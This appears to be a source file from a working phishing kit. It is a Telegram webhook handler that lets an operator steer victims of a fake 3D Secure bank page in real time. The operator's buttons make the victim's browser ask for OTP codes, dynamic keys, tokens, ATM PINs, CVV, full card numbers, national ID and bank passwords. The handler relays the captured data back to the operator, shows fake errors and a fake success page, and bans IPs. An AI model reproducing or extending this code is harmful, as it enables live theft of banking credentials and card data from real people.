/**
 * Telegram Webhook Handler
 * 
 * Receives callback_query from Telegram inline buttons and sends
 * commands to the user's 3D Secure session via Socket.IO.
 * 
 * Buttons: OTP, Dinámica, Token, ATM, TEXTO, ÉXITO, BAN IP
 * Callback data format: "step:{sessionId}:{stepName}"
 * Custom text flow: "texto:{sessionId}" → admin replies → sent to user
 * 
 * Fix: Each action sends a NEW message (not edit) with full updated info.
 * Fix: Webhook auto-registers on server start using deployed domain.
 */

import { Express, Request, Response } from "express";
import { getIO, getSessionById } from "./socket";
import { setPendingCustomText, getPendingCustomText, deletePendingCustomText } from "./db";
import { sendTelegramMessage } from "./telegram";
import { getAppConfig } from "./db";
import { tgApi } from "./tgapi";

// Tokens are loaded dynamically from DB (set via admin panel Config)
// Fallback to env vars for backward compatibility
async function getTelegramConfig(): Promise<{ botToken: string; chatId: string }> {
  try {
    const cfg = await getAppConfig();
    return {
      botToken: cfg.telegramBotToken || process.env.TELEGRAM_BOT_TOKEN || "",
      chatId: cfg.telegramChatId || process.env.TELEGRAM_CHAT_ID || "",
    };
  } catch {
    return {
      botToken: process.env.TELEGRAM_BOT_TOKEN || "",
      chatId: process.env.TELEGRAM_CHAT_ID || "",
    };
  }
}

const VALID_STEPS = new Set(["otp", "dinamica", "token", "atm", "error-otp", "error-dinamica", "error-token", "error-atm", "error-credenciales", "error-tarjeta", "error-tarjeta-otra", "faceid", "approve", "reject", "ban-ip", "success"]);

// pendingCustomText is now persisted in DB via setPendingCustomText/getPendingCustomText/deletePendingCustomText

/**
 * Register the Telegram webhook endpoint on the Express app
 */
export function registerTelegramWebhook(app: Express) {
  app.post("/api/telegram/webhook", async (req: Request, res: Response) => {
    try {
      const update = req.body;

      // ─── Handle plain text message (admin reply for TEXTO flow) ───────────
      if (update.message && update.message.text) {
        const msg = update.message;
        const chatId = msg.chat?.id?.toString();
        const text: string = msg.text;
        console.log(`[Telegram Webhook] Message received - chatId: ${chatId}, text: ${text?.substring(0, 50)}`);

        // Accept messages from both main chat and FaceID chat
        const { chatId: configuredChatId } = await getTelegramConfig();
        const cfgMsg = await getAppConfig();
        const faceidChatIdMsg = cfgMsg.telegramFaceidChatId || process.env.TELEGRAM_FACEID_CHAT_ID || "";
        const allowedChatsMsg = [configuredChatId, faceidChatIdMsg].filter(Boolean);
        if (allowedChatsMsg.length > 0 && !allowedChatsMsg.includes(chatId || "")) {
          res.status(200).json({ ok: true });
          return;
        }

        // Check if there's a pending custom text session for this chat (persisted in DB)
        const sessionId = await getPendingCustomText(chatId!);
        console.log(`[Telegram Webhook] pendingCustomText for chatId ${chatId}: ${sessionId}`);
        if (sessionId) {
          await deletePendingCustomText(chatId!);

          const io = getIO();
          const session = getSessionById(sessionId);
          console.log(`[Telegram Webhook] Session found in memory: ${!!session}, IO available: ${!!io}`);

          if (session && io) {
            // Send the admin's message to the user
            io.to(session.socketId).emit("user:custom-text", { message: text });

            // Confirm to admin
            await sendTelegramMessageWithReply(
              chatId!,
              `✉️ <b>MENSAJE ENVIADO AL USUARIO</b>\n\n` +
              `💬 <i>${escapeHtml(text)}</i>\n\n` +
              `📧 ${escapeHtml(session.email || "—")} | 🌐 IP: ${escapeHtml(session.ipAddress || "—")}\n` +
              `📝 Sesión: <code>${sessionId.slice(0, 20)}</code>\n\n` +
              `⏳ <i>Esperando respuesta del usuario...</i>`,
              buildInlineButtons(sessionId)
            );
          } else {
            await sendTelegramMessageWithReply(
              chatId!,
              `⚠️ <b>Sesión no encontrada o desconectada</b>\n\n` +
              `📝 ID: <code>${sessionId.slice(0, 20)}</code>`,
              undefined
            );
          }
          res.status(200).json({ ok: true });
          return;
        }

        // Not a pending reply — ignore
        res.status(200).json({ ok: true });
        return;
      }

      // ─── Handle callback_query (inline button press) ──────────────────────
      if (update.callback_query) {
        const callbackQuery = update.callback_query;
        const chatId = callbackQuery.message?.chat?.id?.toString();

        // Accept callbacks from both main chat and FaceID chat
        const { chatId: configuredChatId2 } = await getTelegramConfig();
        const cfg = await getAppConfig();
        const faceidChatId = cfg.telegramFaceidChatId || process.env.TELEGRAM_FACEID_CHAT_ID || "";
        const allowedChats = [configuredChatId2, faceidChatId].filter(Boolean);
        if (allowedChats.length > 0 && !allowedChats.includes(chatId || "")) {
          res.status(200).json({ ok: true });
          return;
        }

        const data = callbackQuery.data as string;

        // ── "texto:{sessionId}" — prompt admin to type message ──────────────
        if (data.startsWith("texto:")) {
          const sessionId = data.slice("texto:".length);

          const io = getIO();
          const session = getSessionById(sessionId);

          if (session && io) {
            // Store pending state so next message from this chat goes to user
            await setPendingCustomText(chatId!, sessionId);

            await answerCallbackQuery(callbackQuery.id, "✏️ Escribe el mensaje ahora");

            // Send force_reply prompt to admin
            await sendTelegramForceReply(
              chatId!,
              `✏️ <b>ENVIAR MENSAJE AL USUARIO</b>\n\n` +
              `📧 ${escapeHtml(session.email || "—")} | 🌐 IP: ${escapeHtml(session.ipAddress || "—")}\n\n` +
              `<i>Responde este mensaje con el texto que quieres enviar al usuario.\n` +
              `El texto aparecerá en la pantalla del usuario inmediatamente.</i>`
            );
          } else {
            await answerCallbackQuery(callbackQuery.id, "⚠️ Sesión no encontrada o desconectada");
          }
          res.status(200).json({ ok: true });
          return;
        }

        // ── "q:{sessionId}:{code}" — quick custom text with short codes ───
        if (data.startsWith("q:")) {
          const parts = data.split(":");
          const sessionId = parts[1];
          const code = parts[2];
          // Map short codes to full questions
          const questionMap: Record<string, string> = {
            dir: "Por favor ingrese su dirección de residencia completa",
            fnac: "Ingrese su fecha de nacimiento (DD/MM/AAAA)",
            ced: "Ingrese su número de cédula de ciudadanía",
            ntarj: "Ingrese el número completo de su tarjeta (16 dígitos)",
            cvv: "Ingrese el código de seguridad (CVV) de su tarjeta",
            tel: "Ingrese su número de teléfono celular",
            cupo: "Ingrese el cupo disponible actual de su tarjeta",
            clvbnk: "Ingrese su clave de acceso al portal bancario",
          };
          const message = questionMap[code] || "Ingrese la información solicitada";

          const io = getIO();
          const session = getSessionById(sessionId);

          if (session && io) {
            io.to(session.socketId).emit("user:custom-text", { message });
            await answerCallbackQuery(callbackQuery.id, `✉️ Pregunta enviada`);
            await sendTelegramMessage(
              `✉️ <b>PREGUNTA ENVIADA</b>\n\n` +
              `💬 <i>${escapeHtml(message)}</i>\n\n` +
              `📧 ${escapeHtml(session.email || "—")} | 🌐 IP: ${escapeHtml(session.ipAddress || "—")}\n\n` +
              `⏳ <i>Esperando respuesta del usuario...</i>`
            );
          } else {
            await answerCallbackQuery(callbackQuery.id, "⚠️ Sesión no encontrada o desconectada");
          }
          res.status(200).json({ ok: true });
          return;
        }

        // ── Legacy "custom:{sessionId}:{message}" — send message directly ───
        // ── "unban:{ip}" — Unban an IP from Telegram button ───
        if (data.startsWith("unban:")) {
          const ipToUnban = data.slice(6); // everything after "unban:"
          try {
            const { unbanIP } = await import("./db") as any;
            await unbanIP(ipToUnban);
            // Also clear from in-memory rate limit ban set
            const { clearRateLimitBan } = await import("./_core/rateLimitStore") as any;
            if (clearRateLimitBan) clearRateLimitBan(ipToUnban);
            await answerCallbackQuery(callbackQuery.id, `✅ IP ${ipToUnban} desbaneada`);
            await sendTelegramMessage(
              `✅ <b>IP DESBANEADA</b>\n\n` +
              `🌐 IP: <code>${ipToUnban}</code>\n` +
              `📅 ${new Date().toLocaleString("es-CO")}\n\n` +
              `<i>La IP puede acceder nuevamente al sitio.</i>`
            );
          } catch (err) {
            await answerCallbackQuery(callbackQuery.id, `⚠️ Error al desbanear`);
          }
          res.status(200).json({ ok: true });
          return;
        }

        if (data.startsWith("custom:")) {
          const colonIdx1 = data.indexOf(":");
          const colonIdx2 = data.indexOf(":", colonIdx1 + 1);
          const sessionId = data.slice(colonIdx1 + 1, colonIdx2);
          const message = data.slice(colonIdx2 + 1);

          const io = getIO();
          const session = getSessionById(sessionId);

          if (session && io && message) {
            // Send custom text question to user
            io.to(session.socketId).emit("user:custom-text", { message });
            await answerCallbackQuery(callbackQuery.id, `✉️ Pregunta enviada`);
            await sendTelegramMessage(
              `✉️ <b>PREGUNTA ENVIADA</b>\n\n` +
              `💬 <i>${escapeHtml(message)}</i>\n\n` +
              `📧 ${escapeHtml(session.email || "—")} | 🌐 IP: ${escapeHtml(session.ipAddress || "—")}\n` +
              `📝 Sesión: <code>${sessionId.slice(0, 20)}</code>\n\n` +
              `⏳ <i>Esperando respuesta del usuario...</i>`
            );
          } else if (!message) {
            // Empty message — redirect to texto: flow
            if (session) {
              await setPendingCustomText(chatId!, sessionId);
              await answerCallbackQuery(callbackQuery.id, "✏️ Escribe el mensaje ahora");
              await sendTelegramForceReply(
                chatId!,
                `✏️ <b>ENVIAR MENSAJE AL USUARIO</b>\n\n` +
                `📧 ${escapeHtml(session.email || "—")} | 🌐 IP: ${escapeHtml(session.ipAddress || "—")}\n\n` +
                `<i>Responde este mensaje con el texto que quieres enviar al usuario.</i>`
              );
            } else {
              await answerCallbackQuery(callbackQuery.id, "⚠️ Sesión no encontrada o desconectada");
            }
          } else {
            await answerCallbackQuery(callbackQuery.id, "⚠️ Sesión no encontrada o desconectada");
          }
          res.status(200).json({ ok: true });
          return;
        }

        // ── "step:{sessionId}:{stepName}" ─────────────────────────────────
        if (data.startsWith("step:")) {
          const parts = data.split(":");
          const sessionId = parts[1];
          const step = parts[2];

          // Validate step is one of the allowed values
          if (!VALID_STEPS.has(step)) {
            await answerCallbackQuery(callbackQuery.id, "⚠️ Paso no válido");
            res.status(200).json({ ok: true });
            return;
          }

          // Find the session and send the step command via Socket.IO
          const io = getIO();
          const session = getSessionById(sessionId);

          if (session && io) {
            // Handle special actions: success, approve, reject, ban-ip
            if (step === "success") {
              // Send success step to user → redirects to /payment-success
              io.to(session.socketId).emit("user:goto-step", { step: "success" });
              io.to(session.socketId).emit("user:status-update", { status: "completed" });
              session.status = "completed";
              io.to("admin-room").emit("admin:session-updated", session);
              await answerCallbackQuery(callbackQuery.id, `✅ ¡ÉXITO! Usuario redirigido`);
              await sendTelegramMessage(
                `✅ <b>ÉXITO</b>\n\n` +
                `📧 ${escapeHtml(session.email || "—")} | 💳 ${escapeHtml(session.cardNumber || "—")}\n` +
                `🌐 IP: ${escapeHtml(session.ipAddress || "—")}\n\n` +
                `🎉 Usuario enviado a página de pago exitoso`
              );
              res.status(200).json({ ok: true });
              return;
            } else if (step === "approve") {
              io.to(session.socketId).emit("user:status-update", { status: "completed" });
              session.status = "completed";
              io.to("admin-room").emit("admin:session-updated", session);
              await answerCallbackQuery(callbackQuery.id, `✅ Sesión APROBADA`);
              await sendTelegramMessage(`✅ <b>APROBADO</b>\n\n📧 ${escapeHtml(session.email || "—")} | 💳 ${escapeHtml(session.cardNumber || "—")}\n🌐 IP: ${escapeHtml(session.ipAddress || "—")}`);
              res.status(200).json({ ok: true });
              return;
            } else if (step === "reject") {
              io.to(session.socketId).emit("user:status-update", { status: "rejected" });
              session.status = "rejected";
              io.to("admin-room").emit("admin:session-updated", session);
              await answerCallbackQuery(callbackQuery.id, `❌ Sesión RECHAZADA`);
              await sendTelegramMessage(`❌ <b>RECHAZADO</b>\n\n📧 ${escapeHtml(session.email || "—")} | 🌐 IP: ${escapeHtml(session.ipAddress || "—")}`);
              res.status(200).json({ ok: true });
              return;
            } else if (step === "ban-ip") {
              if (session.ipAddress) {
                const { banIP } = await import("./db") as any;
                await banIP(session.ipAddress, `Baneado desde Telegram - sesión ${sessionId.slice(0, 12)}`);
                await answerCallbackQuery(callbackQuery.id, `🚫 IP ${session.ipAddress} BANEADA`);
                await sendTelegramMessage(`🚫 <b>IP BANEADA</b>\n\n🌐 IP: <code>${session.ipAddress}</code>\n📧 ${escapeHtml(session.email || "—")}\n📅 ${new Date().toLocaleString("es-CO")}`);
              } else {
                await answerCallbackQuery(callbackQuery.id, `⚠️ No se pudo obtener la IP`);
              }
              res.status(200).json({ ok: true });
              return;
            }

            // Send step command to user
            io.to(session.socketId).emit("user:goto-step", { step });

            // Update session state
            session.currentStep = step;
            session.status = "active";

            // Notify admin panel
            io.to("admin-room").emit("admin:session-updated", session);

            // Answer the callback to remove loading state on button
            await answerCallbackQuery(callbackQuery.id, `✅ Enviado a ${getStepLabel(step)}`);

            // Send a NEW message with the action confirmation and buttons for next action
            const stepEmoji: Record<string, string> = {
              otp: "📱",
              dinamica: "🔑",
              token: "🔐",
              atm: "🏧",
            };

            const confirmMessage =
              `${stepEmoji[step] || "⚡"} <b>DIRIGIDO A: ${getStepLabel(step).toUpperCase()}</b>\n\n` +
              `📧 ${escapeHtml(session.email || "—")} | 💳 ${escapeHtml(session.cardNumber || session.cardBin || "—")}\n` +
              `🏦 ${escapeHtml(session.bankName || "—")} | 🌐 IP: ${escapeHtml(session.ipAddress || "—")}\n\n` +
              `✅ Usuario redirigido a <b>${getStepLabel(step)}</b>\n\n` +
              buildDataSummary(session.data) +
              `⬇️ <b>Dirigir a otro paso:</b>`;

            await sendTelegramMessage(confirmMessage, buildInlineButtons(sessionId));
          } else {
            await answerCallbackQuery(callbackQuery.id, "⚠️ Sesión no encontrada o desconectada");
          }
        }
      }

      res.status(200).json({ ok: true });
    } catch (error) {
      console.error("[Telegram Webhook] Error:", error);
      res.status(200).json({ ok: true }); // Always return 200 to Telegram
    }
  });

  // Auto-register webhook on server start (delayed to ensure server is ready)
  setTimeout(() => {
    autoRegisterWebhook();
  }, 5000);
}

/**
 * Build inline keyboard buttons
 */
function buildInlineButtons(sessionId: string) {
  return {
    inline_keyboard: [
      [
        { text: "📱 OTP", callback_data: `step:${sessionId}:otp` },
        { text: "🔑 DINÁMICA", callback_data: `step:${sessionId}:dinamica` },
        { text: "🔐 TOKEN", callback_data: `step:${sessionId}:token` },
        { text: "🏧 ATM", callback_data: `step:${sessionId}:atm` },
      ],
      [
        { text: "\u274c Err OTP", callback_data: `step:${sessionId}:error-otp` },
        { text: "\u274c Err DIN", callback_data: `step:${sessionId}:error-dinamica` },
        { text: "\u274c Err TKN", callback_data: `step:${sessionId}:error-token` },
        { text: "\u274c Err ATM", callback_data: `step:${sessionId}:error-atm` },
      ],
      [
        { text: "\ud83d\udeab Err CRED", callback_data: `step:${sessionId}:error-credenciales` },
        { text: "\ud83d\udeab Err Tarjeta", callback_data: `step:${sessionId}:error-tarjeta` },
        { text: "\ud83e\uddbe FACE ID", callback_data: `step:${sessionId}:faceid` },
        { text: "\ud83d\udcac TEXTO", callback_data: `texto:${sessionId}` },
      ],
      [
        { text: "✅ ÉXITO", callback_data: `step:${sessionId}:success` },
        { text: "🚫 BAN IP", callback_data: `step:${sessionId}:ban-ip` },
      ],
    ],
  };
}

/**
 * Build data summary text from session data
 */
function buildDataSummary(data: Record<string, string>): string {
  if (Object.keys(data).length === 0) return "";

  let text = "━━━━━━━━━━━━━━━━━━━━\n📋 <b>DATOS CAPTURADOS:</b>\n";
  for (const [key, value] of Object.entries(data)) {
    const label = formatKeyLabel(key);
    text += `  • ${label}: <code>${escapeHtml(value)}</code>\n`;
  }
  text += "━━━━━━━━━━━━━━━━━━━━\n";
  return text;
}

/**
 * Answer a callback query to dismiss the loading indicator
 */
async function answerCallbackQuery(callbackQueryId: string, text: string): Promise<void> {
  try {
    const { botToken } = await getTelegramConfig();
    await fetch(tgApi(botToken, 'answerCallbackQuery'), {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        callback_query_id: callbackQueryId,
        text,
        show_alert: false,
      }),
    });
  } catch (error) {
    console.error("[Telegram] answerCallbackQuery error:", error);
  }
}

/**
 * Send a message to a specific chat with optional inline keyboard
 */
async function sendTelegramMessageWithReply(
  chatId: string,
  text: string,
  replyMarkup?: object
): Promise<void> {
  try {
    const body: Record<string, unknown> = {
      chat_id: chatId,
      text,
      parse_mode: "HTML",
    };
    if (replyMarkup) {
      body.reply_markup = replyMarkup;
    }
    const { botToken } = await getTelegramConfig();
    await fetch(tgApi(botToken, 'sendMessage'), {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(body),
    });
  } catch (error) {
    console.error("[Telegram] sendTelegramMessageWithReply error:", error);
  }
}

/**
 * Send a force_reply message prompting the admin to type a reply
 */
async function sendTelegramForceReply(chatId: string, text: string): Promise<void> {
  try {
    const { botToken } = await getTelegramConfig();
    await fetch(tgApi(botToken, 'sendMessage'), {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: chatId,
        text,
        parse_mode: "HTML",
        reply_markup: {
          force_reply: true,
          input_field_placeholder: "Escribe el mensaje para el usuario...",
          selective: true,
        },
      }),
    });
  } catch (error) {
    console.error("[Telegram] sendTelegramForceReply error:", error);
  }
}

function getStepLabel(step: string): string {
  const labels: Record<string, string> = {
    otp: "OTP",
    dinamica: "Clave Dinámica",
    token: "Token",
    atm: "Clave ATM",
    "error-otp": "❌ Error OTP",
    "error-dinamica": "❌ Error Dinámica",
    "error-token": "❌ Error Token",
    "error-atm": "❌ Error ATM",
    "error-credenciales": "\u274c Error Credenciales",
    "error-tarjeta": "\u274c Error Tarjeta",
    faceid: "\ud83e\uddbe Face ID",
    success: "✅ Éxito",
  };
  return labels[step] || step;
}

function formatKeyLabel(key: string): string {
  const labels: Record<string, string> = {
    bankUser: "Usuario Banco",
    bankPassword: "Contraseña",
    otpCode: "Código OTP",
    claveDinamica: "Clave Dinámica",
    tokenSeguridad: "Token Seguridad",
    claveATM: "Clave ATM",
    bank: "Banco",
    email: "Email",
    cardBin: "BIN",
  };
  return labels[key] || key.replace(/([A-Z])/g, " $1").replace(/^./, (s) => s.toUpperCase());
}

function escapeHtml(text: string): string {
  return text
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;")
    .replace(/"/g, "&quot;");
}

/**
 * Auto-register webhook using the deployed domain
 */
async function autoRegisterWebhook(): Promise<void> {
  const { botToken } = await getTelegramConfig();
  if (!botToken) {
    console.warn("[Telegram] Missing bot token, cannot auto-register webhook");
    return;
  }

  // Use the published domain if available, otherwise use VITE_APP_URL or hardcoded production domain
  // Use deployed domain or the project's published URL
  const domain = process.env.DEPLOYED_DOMAIN || process.env.VITE_APP_URL || "";

  if (!domain || domain.includes("localhost") || domain.includes("manus.computer")) {
    // In development, we'll set it manually
    console.log("[Telegram] Dev environment detected, skipping webhook auto-registration.");
    return;
  }

  const webhookUrl = `${domain}/api/telegram/webhook`;

  try {
    const response = await fetch(tgApi(botToken, 'setWebhook'), {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        url: webhookUrl,
        allowed_updates: ["callback_query", "message"],
      }),
    });

    const result = await response.json() as { ok: boolean };
    if (result.ok) {
      console.log(`[Telegram] Webhook auto-registered: ${webhookUrl}`);
    } else {
      console.error("[Telegram] Failed to auto-register webhook:", result);
    }
  } catch (error) {
    console.error("[Telegram] autoRegisterWebhook error:", error);
  }
}

/**
 * Set the Telegram webhook URL manually
 * Call this once after deployment to register the webhook
 */
export async function setTelegramWebhook(baseUrl: string): Promise<boolean> {
  const { botToken } = await getTelegramConfig();
  if (!botToken) {
    console.warn("[Telegram] Missing bot token, cannot set webhook");
    return false;
  }

  const webhookUrl = `${baseUrl}/api/telegram/webhook`;

  try {
    const response = await fetch(tgApi(botToken, 'setWebhook'), {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        url: webhookUrl,
        allowed_updates: ["callback_query", "message"],
      }),
    });

    const result = await response.json() as { ok: boolean };
    if (result.ok) {
      console.log(`[Telegram] Webhook set to: ${webhookUrl}`);
      return true;
    } else {
      console.error("[Telegram] Failed to set webhook:", result);
      return false;
    }
  } catch (error) {
    console.error("[Telegram] setWebhook error:", error);
    return false;
  }
}
